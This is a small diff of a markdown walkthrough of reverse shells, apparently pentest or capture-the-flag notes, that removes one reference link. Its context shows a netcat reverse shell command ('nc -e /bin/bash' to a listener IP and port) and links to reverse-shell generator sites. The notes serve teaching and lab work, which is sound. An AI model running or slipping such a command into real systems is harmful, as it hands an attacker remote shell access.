@@ -41,8 +41,6 @@ nc -e /bin/bash 192.168.122.209 4444
 #### Additional Shell Info
 It's very infrequent that you'd see a machine have netcat (nc) already installed, and even more rare to see one old enough to still support -e (yeah they figured out that's malicious obviously) so you'll likely need to use another type of shell. Determining the right shell to use could be it's own walkthrough.
 
-![https://delta.navisec.io/reverse-shell-reference/](https://delta.navisec.io/reverse-shell-reference/)
-
 ![https://www.revshells.com/](https://www.revshells.com/)
 
 #### Lazy upgrade way, works great on windows
